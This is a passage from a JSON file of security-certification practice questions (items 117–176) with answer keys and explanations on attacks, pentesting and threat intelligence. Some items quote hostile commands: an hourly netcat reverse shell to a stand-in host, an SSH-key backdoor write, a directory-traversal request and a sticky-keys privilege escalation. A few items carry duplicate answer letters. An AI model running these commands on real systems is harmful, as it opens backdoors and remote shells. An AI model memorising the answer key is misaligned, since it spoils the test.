      "question": "117. Ahmed has discovered that attackers spoofed IP addresses to cause them to resolve to a different hardware address. The manipulation has changed the tables maintained by the default gateway for the local network, causing data destined for one specific MAC address to now be routed elsewhere. What type of attack is this?",
      "correct_answer": "A. ARP poisoning",
      "incorrect_answers": [
        "B. DNS poisoning",
        "C. On-path attack",
        "D. Backdoor"
      ],
      "explanation": "This is 'ARP poisoning'. On a local network, ARP is the system that matches a computer's IP address to its physical hardware (MAC) address. In this attack, the baddy sends out fake ARP messages to 'poison' the network's address book, telling it that their computer has the address of a real one. This tricks the network into sending traffic to the attacker instead of the real destination."
    },
    {
      "question": "118. What type of penetration test is being done when the tester is given extensive knowledge of the target network?",
      "correct_answer": "A. Known environment",
      "incorrect_answers": [
        "B. Full disclosure",
        "C. Unknown environment",
        "D. Red team"
      ],
      "explanation": "This is a 'known environment' or 'white-box' test. The testers are given all the information they need, like network maps and login details. This isn't cheating; it allows them to do a much more thorough test and find deeper problems that an outside attacker might miss. It's like giving a friendly builder the blueprints to your house so they can check for structural problems."
    },
    {
      "question": "119. Your company is instituting a new security awareness program. You are responsible for educating end users on a variety of threats, including social engineering. Which of the following best defines social engineering?",
      "correct_answer": "C. Using people skills to obtain proprietary information",
      "incorrect_answers": [
        "A. Illegal copying of software",
        "B. Gathering information from discarded manuals and printouts",
        "D. Phishing emails"
      ],
      "explanation": "Social engineering is basically hacking people instead of computers. It's all about manipulating people and using psychology to trick them into giving away information they shouldn't, like passwords or company secrets. Phishing emails are a type of social engineering, but the term itself is much broader."
    },
    {
      "question": "120. Which of the following attacks can be caused by a user being unaware of their physical surroundings?",
      "correct_answer": "C. Shoulder surfing",
      "incorrect_answers": [
        "A. ARP poisoning",
        "B. Phishing",
        "D. Smurf attack"
      ],
      "explanation": "'Shoulder surfing' is exactly what it sounds like: someone looking over your shoulder to see what you're typing. It's a very simple, low-tech attack that happens in public places like coffee shops or on the train. People can easily steal your password or see sensitive information if you're not careful about who's behind you."
    },
    {
      "question": "121. What are the two most common goals of invoice scams?",
      "correct_answer": "A. Receiving money or acquiring credentials",
      "incorrect_answers": [
        "B. Acquiring credentials or delivering a rootkit",
        "C. Receiving money or stealing cryptocurrency",
        "D. Acquiring credentials or delivering ransomware"
      ],
      "explanation": "Invoice scams usually have one of two goals. The first is to trick the company's finance department into paying a fake invoice, so the money goes straight to the attacker. The second is to send an email with a link to 'view the invoice', which takes the user to a fake login page where the attacker can steal their password ('acquiring credentials')."
    },
    {
      "question": "122. Which of the following type of testing uses an automated process of proactively identifying vulnerabilities of the computing systems present on a network?",
      "correct_answer": "B. Vulnerability scanning",
      "incorrect_answers": [
        "A. Security audit",
        "C. A known environment test",
        "D. An unknown environment test"
      ],
      "explanation": "This is a 'vulnerability scan'. These scans use special software to automatically check all the computers on a network for known security holes. It's like having a robot that goes around checking every door and window to see if it's locked and then gives you a report of any problems it found."
    },
    {
      "question": "123. John has been asked to do a penetration test of a company. He has been given general information but no details about the network. What kind of test is this?",
      "correct_answer": "A. Partially known environment",
      "incorrect_answers": [
        "B. Known environment",
        "C. Unknown environment",
        "D. Masked"
      ],
      "explanation": "This is a 'partially known environment' or 'gray-box' test. John has been given some information, but not everything. It's a middle ground between a 'white-box' test (where you know everything) and a 'black-box' test (where you know nothing). It simulates an attack from someone who might have a bit of insider knowledge, like a disgruntled employee."
    },
    {
      "question": "124. Under which type of attack does an attacker's system appear to be the server to the real client and appear to be the client to the real server?",
      "correct_answer": "D. On-path",
      "incorrect_answers": [
        "A. Denial-of-service",
        "B. Replay",
        "C. Eavesdropping"
      ],
      "explanation": "This is an 'on-path' attack, also known as a 'man-in-the-middle' attack. The attacker secretly places themselves in the middle of a conversation between two computers. Each computer thinks it's talking directly to the other one, but they're actually both talking to the attacker, who can read, change, or block all the messages."
    },
    {
      "question": "125. You are a security administrator for Acme Corporation. You have discovered malware on some of your company's machines. This malware seems to intercept calls from the web browser to libraries, and then manipulates the browser calls. What type of attack is this?",
      "correct_answer": "A. Man in the browser",
      "incorrect_answers": [
        "B. On-path attack",
        "C. Buffer overflow",
        "D. Session hijacking"
      ],
      "explanation": "This is a 'Man-in-the-Browser' attack. It's a type of Trojan horse that infects your web browser. Once it's in there, it can silently change what you see. For example, when you go to your online banking page, it could change the bank's account number to the attacker's account number, so you accidentally send money to the wrong person."
    },
    {
      "question": "126. Tony is reviewing a web application and discovers the website generates links like the following:\nhttps://www.example.com/login.html?\nRelay=http%3A%2F%2Fexample.com%2Fsite.html\nWhat type of vulnerability is this code most likely to be susceptible to?",
      "correct_answer": "B. URL redirection",
      "incorrect_answers": [
        "A. SQL injection",
        "C. DNS poisoning",
        "D. LDAP injection"
      ],
      "explanation": "This is a 'URL redirection' vulnerability. The website is set up to automatically send users to another page after they log in. An attacker could change the 'Relay' part of the link to point to their own malicious website. So, after you log in, you get redirected to a bad site instead of the one you were expecting."
    },
    {
      "question": "127. You are responsible for software testing at Acme Corporation. You want to check all software for bugs that might be used by an attacker to gain entrance into the software or your network. You have discovered a web application that would allow a user to attempt to put a 64-bit value into a 4-byte integer variable. What is this type of flaw?",
      "correct_answer": "D. Integer overflow",
      "incorrect_answers": [
        "A. Memory overflow",
        "B. Buffer overflow",
        "C. Variable overflow"
      ],
      "explanation": "This is an 'integer overflow'. An integer variable is like a box designed to hold a number of a certain size. If you try to stuff a really big number into a box that's too small, it 'overflows'. This can cause the program to behave strangely, crash, or sometimes even be exploited by an attacker."
    },
    {
      "question": "128. Angela has discovered an attack against some of the users of her website that leverage URL parameters and cookies to make legitimate users perform unwanted actions. What type of attack has she most likely discovered?",
      "correct_answer": "B. Cross-site request forgery",
      "incorrect_answers": [
        "A. SQL injection",
        "C. LDAP injection",
        "D. Cross-site scripting"
      ],
      "explanation": "This is 'Cross-Site Request Forgery' (CSRF). The attacker tricks a logged-in user into performing an action they didn't intend to. For example, they might send the user a link that, when clicked, secretly uses the user's login 'cookie' to post something on their social media or change their email address. The website trusts the request because it came from the user's browser, even though the user didn't know about it."
    },
    {
      "question": "129. Nathan discovers the following code in the directory of a compromised user. What language is it using, and what will it do?\necho \"ssh-rsa ABBAB4KAE9sdafAK…Mq/jc5YLfnAnbFDRABMhuWzaWUp root@localhost\" >> /root/.ssh/authorized_keys",
      "correct_answer": "D. Bash, adds an authorized SSH key",
      "incorrect_answers": [
        "A. Python, adds an authorized SSH key",
        "B. Bash, connects to another system using an SSH key",
        "C. Python, connects to another system using an SSH key"
      ],
      "explanation": "This is a 'Bash' command, which is the command language for Linux. The `echo` command is writing a long string of text (an SSH public key) and adding it to a special file called `authorized_keys`. This file tells the computer which users are allowed to log in without a password. So, this command is adding a baddy's key to the list, giving them a secret backdoor into the system."
    },
    {
      "question": "130. Jared has discovered malware on the workstations of several users. This particular malware provides administrative privileges for the workstation to an external hacker. What best describes this malware?",
      "correct_answer": "D. Rootkit",
      "incorrect_answers": [
        "A. Trojan horse",
        "B. Logic bomb",
        "C. Multipartite virus"
      ],
      "explanation": "This is a 'rootkit'. The name comes from 'root', which is the all-powerful administrator account on Linux systems. A rootkit is a type of malware specifically designed to get and keep this top-level access. They are often very good at hiding themselves, making them difficult to find and remove."
    },
    {
      "question": "131. Why are memory leaks a potential security issue?",
      "correct_answer": "C. They can cause crashes",
      "incorrect_answers": [
        "A. They can expose sensitive data.",
        "B. They can allow attackers to inject code via the leak.",
        "D. None of the above"
      ],
      "explanation": "A memory leak is when a program keeps taking up more and more memory without ever releasing it. Eventually, it will use up all the available memory on the computer, which can cause the program, or even the whole computer, to crash. If an attacker can trigger the leak, they can use it to take a service offline."
    },
    {
      "question": "132. Michelle discovers that a number of systems throughout her organization are connecting to a changing set of remote systems on TCP port 6667. What is the most likely cause of this, if she believes the traffic is not legitimate?",
      "correct_answer": "B. Botnet command and control via IRC",
      "incorrect_answers": [
        "A. An alternate service port for web traffic",
        "C. Downloads via a peer-to-peer network",
        "D. Remote access Trojans"
      ],
      "explanation": "This is a bit of a detective question! Port 6667 is the traditional port for IRC (Internet Relay Chat), an old-school chat system. Hackers often use IRC as a secret 'command and control' channel for their botnets. The infected computers are likely connecting to a hidden chat room to get their orders from the botnet master."
    },
    {
      "question": "133. Susan performs a vulnerability scan of a small business network and discovers that the organization's consumer-grade wireless router has a vulnerability in its web server. What issue should she address in her findings?",
      "correct_answer": "A. Firmware patch management",
      "incorrect_answers": [
        "B. Default configuration issues",
        "C. An unsecured administrative account",
        "D. Weak encryption settings"
      ],
      "explanation": "The problem here is 'firmware patch management'. The 'firmware' is the basic software that makes a device like a router work. Just like your computer's operating system, this firmware needs to be updated ('patched') to fix security holes. The scan found a known vulnerability, which means the router's firmware is out of date and needs to be updated."
    },
    {
      "question": "134. Where is an RFID attack most likely to occur as part of a penetration test?",
      "correct_answer": "B. Access badges",
      "incorrect_answers": [
        "A. System authentication",
        "C. Web application access",
        "D. VPN logins"
      ],
      "explanation": "RFID technology is most commonly found in 'access badges' – the cards you tap to get into an office building. A penetration tester would target these badges to try and clone them or capture their data, which would give them physical access to the building, a major step in a security test."
    },
    {
      "question": "135. What type of phishing attack occurs via text messages?",
      "correct_answer": "B. Smishing",
      "incorrect_answers": [
        "A. Bluejacking",
        "C. Phonejacking",
        "D. Text whaling"
      ],
      "explanation": "Phishing done via SMS text messages is called 'smishing'. It's a simple mash-up of the words 'SMS' and 'phishing'. The attack is the same – trying to get you to click a bad link or give away information – but the delivery method is a text message instead of an email."
    },
    {
      "question": "136. Users in your company report someone has been calling their extension and claiming to be doing a survey for a large vendor. Based on the questions asked in the survey, you suspect that this is a scam to elicit information from your company's employees. What best describes this?",
      "correct_answer": "B. Vishing",
      "incorrect_answers": [
        "A. Spear phishing",
        "C. War dialing",
        "D. Robocalling"
      ],
      "explanation": "This is 'vishing', which is short for 'voice phishing'. It's just a phishing attack that happens over the phone. The attacker calls up and uses their voice and social engineering tricks to try and get information out of you. It's often more effective than email because people can find it harder to say no to a real person."
    },
    {
      "question": "137. John is analyzing a recent malware infection on his company network. He discovers malware that can spread rapidly via vulnerable network services and does not require any interaction from the user. What best describes this malware?",
      "correct_answer": "A. Worm",
      "incorrect_answers": [
        "B. Virus",
        "C. Logic bomb",
        "D. Trojan horse"
      ],
      "explanation": "This is a 'worm'. The key difference between a worm and a regular virus is that a worm can spread all by itself. It actively looks for other vulnerable computers on the network and copies itself to them without needing a human to do anything. This is what allows them to spread so quickly."
    },
    {
      "question": "138. Your company has issued some new security directives. One of these new directives is that all documents must be shredded before being thrown out. What type of attack is this trying to prevent?",
      "correct_answer": "B. Dumpster diving",
      "incorrect_answers": [
        "A. Phishing",
        "C. Shoulder surfing",
        "D. On-path attack"
      ],
      "explanation": "Shredding documents is a simple way to stop 'dumpster diving'. Attackers can learn a lot by going through a company's rubbish bins, finding things like old reports, customer lists, or even carelessly discarded passwords. Shredding makes it much harder for them to piece that information back together."
    },
    {
      "question": "139. Which of the following is not a common part of a cleanup process after a penetration test?",
      "correct_answer": "B. Restoring all rootkits to their original settings on the system",
      "incorrect_answers": [
        "A. Removing all executables and scripts from the compromised system",
        "C. Returning all system settings and application configurations to their original configurations",
        "D. Removing any user accounts created during the penetration test"
      ],
      "explanation": "A professional penetration tester should always clean up after themselves. This means removing any tools they used, deleting any accounts they created, and putting everything back exactly as they found it. The one thing they definitely *shouldn't* do is leave a rootkit (a piece of malware) on the system! That would be very bad form indeed."
    },
    {
      "question": "140. You have discovered that someone has been trying to log on to your web server. The person has tried a wide range of likely passwords. What type of attack is this?",
      "correct_answer": "C. Dictionary attack",
      "incorrect_answers": [
        "A. Rainbow table",
        "B. Birthday attack",
        "D. Spoofing"
      ],
      "explanation": "This is a 'dictionary attack'. The attacker is using a list ('dictionary') of common and likely passwords and trying them one by one. It's less random than a full 'brute-force' attack, but it's often successful because so many people use easy-to-guess passwords like 'password123'."
    },
    {
      "question": "141. Jim discovers a physical device attached to a gas pump's credit card reader. What type of attack has he likely discovered?",
      "correct_answer": "C. A skimmer",
      "incorrect_answers": [
        "A. A replay attack",
        "B. A race condition",
        "D. A card cloner"
      ],
      "explanation": "Jim has found a 'skimmer'. This is a dodgy little device that attackers physically attach to things like cash machines or petrol pumps. When you put your card in, the skimmer reads all the data from the magnetic stripe. Often, they'll also have a tiny camera to record you typing in your PIN. It's a common way to steal card details."
    },
    {
      "question": "142. What is the primary difference between active and passive reconnaissance?",
      "correct_answer": "D. Active will actually connect to the network and could be detected; passive won't.",
      "incorrect_answers": [
        "A. Active will be done manually, passive with tools.",
        "B. Active is done with black-box tests and passive with white-box tests.",
        "C. Active is usually done by attackers and passive by testers."
      ],
      "explanation": "The main difference is contact. 'Passive reconnaissance' is like being a spy gathering information from public sources without ever going near the target. 'Active reconnaissance' is when you start to interact with the target's network, for example, by doing a port scan. This is 'active' because it sends packets to their systems, which means there's a chance they could detect you."
    },
    {
      "question": "143. A browser toolbar is an example of what type of malware?",
      "correct_answer": "D. A PUP",
      "incorrect_answers": [
        "A. A rootkit",
        "B. A RAT",
        "C. A worm"
      ],
      "explanation": "Annoying browser toolbars that you didn't ask for are often classed as 'PUPs', or Potentially Unwanted Programmes. They're not always dangerous viruses, but they are unwanted, can slow your computer down, and sometimes spy on your browsing habits. They're basically pests."
    },
    {
      "question": "144. What term describes data that is collected from publicly available sources that can be used in an intelligence context?",
      "correct_answer": "B. OSINT",
      "incorrect_answers": [
        "A. OPSEC",
        "C. IntCon",
        "D. STIX"
      ],
      "explanation": "This is 'OSINT', which stands for Open-Source Intelligence. It's the practice of gathering information from places that are open to the public, like websites, social media, news articles, and public records. Hackers and security professionals both use OSINT to learn about their targets."
    },
    {
      "question": "145. What type of attack targets a specific group of users by infecting one or more websites that that group is specifically known to visit frequently?",
      "correct_answer": "C. A watering hole attack",
      "incorrect_answers": [
        "A. A watercooler attack",
        "B. A phishing net attack",
        "D. A phish pond attack"
      ],
      "explanation": "This is a 'watering hole' attack. Think of how a lion waits at a watering hole where it knows all the zebras will come to drink. In the digital world, an attacker will find a website that their target group often visits and infect that site with malware. They then just wait for their victims to come to the 'watering hole' and get infected."
    },
    {
      "question": "146. Tracy is concerned about LDAP injection attacks against her directory server. Which of the following is not a common technique to prevent LDAP injection attacks?",
      "correct_answer": "C. LDAP query parameterization",
      "incorrect_answers": [
        "A. Secure configuration of LDAP",
        "B. User input validation",
        "D. Output filtering rules"
      ],
      "explanation": "'Parameterization' is a technique mostly used to stop SQL injection, not LDAP injection. For LDAP (which is like an address book for networks), the best defences are to make sure you're properly validating all user input (the 'bouncer' at the door) and filtering what information gets sent back, so you don't accidentally give away too many secrets."
    },
    {
      "question": "147. Fred uses a Tor proxy to browse for sites as part of his threat intelligence. What term is frequently used to describe this part of the Internet?",
      "correct_answer": "B. The dark web",
      "incorrect_answers": [
        "A. Through the looking glass",
        "C. The underweb",
        "D. Onion-space"
      ],
      "explanation": "Fred is browsing the 'dark web'. This is a part of the internet that you can't get to with a normal browser like Chrome or Safari. You need special software like Tor to access it. It's known for being a place where a lot of illegal activity happens because it's designed to be anonymous."
    },
    {
      "question": "148. What browser feature is used to help prevent successful URL redirection attacks?",
      "correct_answer": "B. Displaying the full real URL",
      "incorrect_answers": [
        "A. Certificate expiration tracking",
        "B. Disabling cookies",
        "D. Enabling JavaScript"
      ],
      "explanation": "Modern web browsers help stop this by always showing you the full, real web address in the address bar. In the past, it was easier for dodgy websites to hide their true address, making it easier to trick you. Now, you can look at the address bar and see if you're really on 'your-bank.com' or a fake site like 'your-bank.security-update.com'."
    },
    {
      "question": "149. What is the most significant difference between cloud service-based and on-premises vulnerabilities?",
      "correct_answer": "A. Your ability to remediate it yourself",
      "incorrect_answers": [
        "B. The severity of the vulnerability",
        "C. The time required to remediate",
        "D. Your responsibility for compromised data"
      ],
      "explanation": "The biggest difference is who gets to fix it. If you have a security hole ('vulnerability') on your own server in your office ('on-premises'), you can fix it yourself. But if the vulnerability is in a cloud service (like Google Drive or Office 365), you have to wait for the cloud company to fix it. You can't do it yourself."
    },
    {
      "question": "150. Christina runs a vulnerability scan of a customer network and discovers that a consumer wireless router on the network returns a result reporting default login credentials. What common configuration issue has she encountered?",
      "correct_answer": "C. An unsecured administrator account",
      "incorrect_answers": [
        "A. An unpatched device",
        "B. An out of support device",
        "D. An unsecured user account"
      ],
      "explanation": "Christina has found an 'unsecured administrator account'. The router is still using the factory-set username and password. This is a huge security risk because hackers know all the default passwords and will try them first. It's like moving into a new house and never changing the locks."
    },
    {
      "question": "151. What type of team is used to test security by using tools and techniques that an actual attacker would use?",
      "correct_answer": "A. A red team",
      "incorrect_answers": [
        "B. A blue team",
        "C. A white team",
        "D. A purple team"
      ],
      "explanation": "This is a 'Red Team'. They are the 'good-guy hackers' who are hired to think and act like a real attacker. Their job is to try and break into the company's systems to find weaknesses before the real baddies do. The 'Blue Team' are the defenders who try to stop them."
    },
    {
      "question": "152. While reviewing web logs for her organization's website Kathleen discovers the entry shown here:\nGET http://example.com/viewarticle.php?view=../../../config.txt HTTP/1.1\nWhat type of attack has she potentially discovered?",
      "correct_answer": "A. A directory traversal attacks",
      "incorrect_answers": [
        "B. A web application buffer overflow",
        "C. A directory recursion attack",
        "D. A slashdot attack"
      ],
      "explanation": "This is a 'directory traversal' attack. The `../` part of the web address is a command that means 'go up one folder'. The attacker is trying to trick the web server into 'traversing' or walking up out of the normal web folder and into other parts of the server, so they can read sensitive files like `config.txt` that they shouldn't have access to."
    },
    {
      "question": "153. What is the key differentiator between SOAR and SIEM systems?",
      "correct_answer": "C. SOAR includes security operations automation.",
      "incorrect_answers": [
        "A. SOAR integrates with a wider range of applications.",
        "B. SIEM includes threat and vulnerability management tools.",
        "D. SIEM includes security operations automation."
      ],
      "explanation": "The 'A' in SOAR stands for 'Automation'. While a SIEM system is great at collecting all the security logs and alerts in one place, a SOAR system takes the next step. It can automatically *do* things in response to an alert, like blocking an IP address or locking an account, without a human needing to click any buttons. It makes the security team's job much faster."
    },
    {
      "question": "154. Your company has hired a penetration testing firm to test the network. For the test, you have given the company details on operating systems you use, applications you run, and network devices. What best describes this type of test?",
      "correct_answer": "A. Known environment test",
      "incorrect_answers": [
        "B. External test",
        "C. Unknown environment test",
        "D. Threat test"
      ],
      "explanation": "This is a 'known environment' or 'white-box' test. You're giving the testers all the inside information. This lets them do a very deep and thorough test to find security holes that an outside attacker, who knows nothing, might miss. It's like giving an inspector the full blueprints to your house."
    },
    {
      "question": "155. What two files are commonly attacked using offline brute-force attacks?",
      "correct_answer": "C. The Windows SAM and the Linux /etc/shadow file",
      "incorrect_answers": [
        "A. The Windows registry and the Linux /etc/passwd file",
        "B. The Windows SAM and the Linux /etc/passwd file",
        "D. The Windows registry and the Linux /etc/shadow file"
      ],
      "explanation": "On Windows, the scrambled passwords are kept in the 'SAM' file. On Linux, they're in the '/etc/shadow' file. If an attacker can steal a copy of one of these files, they can take it 'offline' to their own computer and use powerful tools to try and crack the passwords without being detected."
    },
    {
      "question": "156. What type of attack is an SSL stripping attack?",
      "correct_answer": "C. An on-path attack",
      "incorrect_answers": [
        "A. A brute-force attack",
        "B. A Trojan attack",
        "D. A downgrade attack"
      ],
      "explanation": "SSL stripping is a type of 'on-path' (or man-in-the-middle) attack. The attacker gets in the middle of your connection to a website. When you try to make a secure (HTTPS) connection, the attacker intercepts it, makes the secure connection to the website themselves, but then serves you an insecure (HTTP) version. You think you're secure, but the attacker is reading everything."
    },
    {
      "question": "157. What type of attack is the U.S. Trusted Foundry program intended to help prevent?",
      "correct_answer": "C. Supply chain attacks",
      "incorrect_answers": [
        "A. Critical infrastructure attacks",
        "B. Metalwork and casting attacks",
        "D. Software source code attacks"
      ],
      "explanation": "This program is designed to stop 'supply chain attacks'. A supply chain is everyone involved in making a product, from the raw materials to the finished item. The Trusted Foundry program makes sure that the computer chips used in important military and government equipment are made in a secure, trusted factory, so that no enemies can sneak in a hidden backdoor during production."
    },
    {
      "question": "158. Nicole wants to show the management in her organization real-time data about attacks from around the world via multiple service providers in a visual way. What type of threat intelligence tool is often used for this purpose?",
      "correct_answer": "B. A threat map",
      "incorrect_answers": [
        "A. A pie chart",
        "C. A dark web tracker",
        "D. An OSINT repository"
      ],
      "explanation": "Nicole is looking for a 'threat map'. These are cool-looking maps of the world that show cyberattacks happening in real-time, with lines zipping from one country to another. They are a great way to visually show managers how many attacks are going on all the time, even if they aren't always super useful for day-to-day security work."
    },
    {
      "question": "159. You have noticed that when in a crowded area, data from your cell phone is stolen. Later investigation shows a Bluetooth connection to your phone, one that you cannot explain. What describes this attack?",
      "correct_answer": "B. Bluesnarfing",
      "incorrect_answers": [
        "A. Bluejacking",
        "C. Evil twin",
        "D. RAT"
      ],
      "explanation": "This is 'bluesnarfing'. It's the evil cousin of 'bluejacking'. Instead of just sending you an annoying message, bluesnarfing is when an attacker uses a weak Bluetooth connection to actually connect to your phone and steal data, like your contacts, photos, or text messages. It's much more serious."
    },
    {
      "question": "160. The type and scope of testing, client contact details, how sensitive data will be handled, and the type and frequency of status meetings and reports are all common elements of what artifact of a penetration test?",
      "correct_answer": "B. The rules of engagement",
      "incorrect_answers": [
        "A. The black-box outline",
        "C. The white-box outline",
        "D. The close-out report"
      ],
      "explanation": "This is all part of the 'Rules of Engagement'. Before a penetration test starts, the testers and the company have to agree on a set of rules, just like in a friendly boxing match. This document outlines exactly what the testers are allowed to do, what's off-limits, who to call if something goes wrong, and how they will report their findings."
    },
    {
      "question": "161. Amanda encounters a Bash script that runs the following command:\ncrontab -e 0 * * * * nc example.com 8989 -e /bin/bash\nWhat does this command do?",
      "correct_answer": "C. It sets up a reverse shell.",
      "incorrect_answers": [
        "A. It checks the time every hour.",
        "B. It pulls data from example .com every minute.",
        "D. None of the above"
      ],
      "explanation": "This is a sneaky one that sets up a 'reverse shell'. The `crontab` part schedules a task to run every hour. The task itself (`nc...`) tells the computer to connect *out* to the attacker's computer (`example.com`) and give them a command prompt ('shell'). It's called a 'reverse' shell because the infected computer calls the attacker, which is often easier to get past a firewall than the attacker calling in."
    },
    {
      "question": "162. A penetration tester called a help desk staff member at the company that Charles works at and claimed to be a senior executive who needed her password changed immediately due to an important meeting they needed to conduct that would start in a few minutes. What social engineering principle did the penetration tester leverage to accomplish this attack?",
      "correct_answer": "C. Urgency",
      "incorrect_answers": [
        "A. Intimidation",
        "B. Scarcity",
        "D. Trust"
      ],
      "explanation": "The main trick here is 'urgency'. By saying the meeting is starting in a few minutes, the tester is creating a sense of panic. They are trying to rush the help desk person into making a mistake and not following the proper security procedures. The claim to be an executive also adds a bit of 'authority' to the mix."
    },
    {
      "question": "163. Patrick has subscribed to a commercial threat intelligence feed that is only provided to subscribers who have been vetted and who pay a monthly fee. What industry term is used to refer to this type of threat intelligence?",
      "correct_answer": "A. Proprietary threat intelligence",
      "incorrect_answers": [
        "B. OSINT",
        "C. ELINT",
        "D. Corporate threat intelligence"
      ],
      "explanation": "This is 'proprietary' (or 'closed') threat intelligence. Unlike 'OSINT' (Open-Source Intelligence), which is free and available to everyone, proprietary feeds are private services that you have to pay for. They often provide more detailed or specialised information that you can't get from public sources."
    },
    {
      "question": "164. What threat hunting concept involves thinking like a malicious actor to help identify indicators of compromise that might otherwise be hidden?",
      "correct_answer": "B. Maneuver",
      "incorrect_answers": [
        "A. Intelligence fusion",
        "C. Threat feed analysis",
        "D. Bulletin analysis"
      ],
      "explanation": "This concept is called 'maneuver'. It's a bit of a military term, but in cybersecurity it means trying to get inside the head of an attacker. By thinking about what a hacker would do, where they would hide, and what their goals are, a security person ('threat hunter') can be more effective at finding their tracks."
    },
    {
      "question": "165. What type of malicious actor will typically have the least amount of resources available to them?",
      "correct_answer": "B. Script kiddies",
      "incorrect_answers": [
        "A. Nation-states",
        "C. Hacktivists",
        "D. Organized crime"
      ],
      "explanation": "'Script kiddies' are at the bottom of the food chain. They are usually teenagers or amateurs with very little skill or money ('resources'). They just use tools that other people have made. At the top are 'nation-states' (governments), who have almost unlimited resources, followed by organised crime groups and then hacktivists."
    },
    {
      "question": "166. A SYN flood seeks to overwhelm a system by tying up all the open sessions that it can create. What type of attack is this?",
      "correct_answer": "B. A resource exhaustion attack",
      "incorrect_answers": [
        "A. A DDoS",
        "C. An application exploit",
        "D. A vulnerability exploit"
      ],
      "explanation": "A SYN flood is a 'resource exhaustion' attack. It works by sending lots of requests to start a conversation with a server but never finishing the 'handshake'. Each half-open conversation uses up a little bit of the server's memory ('resources'). The attacker sends so many that the server runs out of memory and can't accept any new, real connections."
    },
    {
      "question": "167. A penetration tester calls a staff member for her target organization and introduces herself as a member of the IT support team. She asks if the staff member has encountered a problem with their system, then proceeds to ask for details about the individual, claiming she needs to verify that she is talking to the right person. What type of social engineering attack is this?",
      "correct_answer": "A. Pretexting",
      "incorrect_answers": [
        "B. A watering hole attack",
        "C. Prepending",
        "D. Shoulder surfing"
      ],
      "explanation": "This is 'pretexting'. The tester has created a made-up story, or 'pretext', to make her questions seem legitimate. By pretending to be from IT support and trying to 'verify' the user's details, she creates a believable situation where the user is more likely to give away personal information without becoming suspicious."
    },
    {
      "question": "168. What term describes the use of airplanes or drones to gather network or other information as part of a penetration test or intelligence gathering operation?",
      "correct_answer": "C. War flying",
      "incorrect_answers": [
        "A. Droning",
        "B. Air Snarfing",
        "D. Aerial snooping"
      ],
      "explanation": "This is 'war flying'. It's the same idea as 'war driving' (driving around in a car to map Wi-Fi networks), but using a drone or a plane instead. This allows the tester to cover a much larger area and get a better signal from high up, helping them to map out the target's wireless footprint."
    },
    {
      "question": "169. Gabby wants to protect a legacy platform with known vulnerabilities. Which of the following is not a common option for this?",
      "correct_answer": "C. Rely on the outdated OS to confuse attackers.",
      "incorrect_answers": [
        "A. Disconnect it from the network.",
        "B. Place the device behind a dedicated firewall and restrict inbound and outbound traffic.",
        "D. Move the device to a protected VLAN."
      ],
      "explanation": "Hoping that an old system will 'confuse' an attacker is a terrible idea! Attackers often specifically look for old, unsupported systems because they are full of known security holes. The real ways to protect it are to isolate it from the rest of the network, either by completely unplugging it, putting it on its own separate network ('VLAN'), or hiding it behind a very strict firewall."
    },
    {
      "question": "170. In the United States, collaborative industry organizations that analyze and share cybersecurity threat information within their industry verticals are known by what term?",
      "correct_answer": "B. ISACs",
      "incorrect_answers": [
        "A. IRTs",
        "C. Feedburners",
        "D. Vertical threat feeds"
      ],
      "explanation": "These groups are called 'ISACs', which stands for Information Sharing and Analysis Centres. There's an ISAC for many different industries, like banking, healthcare, and electricity. All the companies in that industry can join the ISAC and share information about the specific threats they are seeing, so everyone can be better prepared."
    },
    {
      "question": "171. After running nmap against a system on a network, Lucca sees that TCP port 23 is open and a service is running on it. What issue should he identify?",
      "correct_answer": "B. Telnet is an insecure protocol.",
      "incorrect_answers": [
        "A. Low ports should not be open to the Internet.",
        "C. SSH is an insecure protocol.",
        "D. Ports 1-1024 are well-known ports and must be firewalled."
      ],
      "explanation": "Port 23 is the standard 'door' for a very old service called Telnet. The big problem with Telnet is that it's an 'insecure protocol' – it sends everything, including your password, in plain text for anyone to see. It should never be used on a modern network; a secure alternative called SSH should be used instead."
    },
    {
      "question": "172. During a penetration test, Cameron gains physical access to a Windows system and uses a system repair disk to copy cmd.exe to the %systemroot%\\system32 directory while renaming it sethc.exe. When the system boots, he is able to log in as an unprivileged user, hit the Shift key five times, and open a command prompt with system-level access using sticky keys. What type of attack has he conducted?",
      "correct_answer": "B. A privilege escalation attack",
      "incorrect_answers": [
        "A. A Trojan attack",
        "C. A denial-of-service attack",
        "D. A swapfile attack"
      ],
      "explanation": "This is a clever 'privilege escalation' attack. The 'sethc.exe' program is what normally runs when you press the Shift key five times (the Sticky Keys feature). By replacing it with the command prompt (cmd.exe), Cameron has created a secret backdoor. Now, even from the login screen, he can pop up a super-powerful command prompt and take full control of the computer."
    },
    {
      "question": "173. Adam wants to describe threat actors using common attributes. Which of the following list is not a common attribute used to describe threat actors?",
      "correct_answer": "C. Years of experience",
      "incorrect_answers": [
        "A. Internal/external",
        "B. Resources or funding level",
        "D. Intent/motivation"
      ],
      "explanation": "While 'years of experience' might be interesting, it's not a standard way to classify hackers. The important things to know are: are they an 'insider' or an 'outsider'? How much money and skill do they have ('resources')? And what do they want ('motivation') – are they after money, secrets, or just causing trouble?"
    },
    {
      "question": "174. Madhuri is concerned about the security of the machine learning algorithms that her organization is deploying. Which of the following options is not a common security precaution for machine learning algorithms?",
      "correct_answer": "B. Requiring a third-party review of all proprietary algorithms",
      "incorrect_answers": [
        "A. Ensuring the source data is secure and of sufficient quality",
        "B. Requiring change control and documentation for all changes to the algorithms",
        "D. Ensuring a secure environment for all development, data acquisition, and storage"
      ],
      "explanation": "While getting an outside opinion can be good, companies almost never let a third party look at their 'proprietary' (secret) algorithms. These are often their most valuable secrets! The real security measures are making sure the data used to train the algorithm is good and secure, and keeping tight control over any changes made to the code."
    },
    {
      "question": "175. Frank is part of a white team for a cybersecurity exercise. What role will he and his team have?",
      "correct_answer": "A. Performing oversight and judging of the exercise",
      "incorrect_answers": [
        "B. Providing full details of the environment to the participants",
        "C. Providing partial details of the environment to the participants",
        "D. Providing defense against the attackers in the exercise"
      ],
      "explanation": "The 'White Team' are the umpires or judges of the cybersecurity game. They set the rules, watch what the Red Team (attackers) and Blue Team (defenders) are doing, and decide who is winning. They make sure the whole exercise runs smoothly and fairly."
    },
    {
      "question": "176. Susan receives $10,000 for reporting a vulnerability to a vendor who participates in a program to identify issues. What term is commonly used to describe this type of payment?",
      "correct_answer": "C. A bug bounty",
      "incorrect_answers": [
        "A. A ransom",
        "B. A payday",
        "D. A zero-day disclosure"
      ],
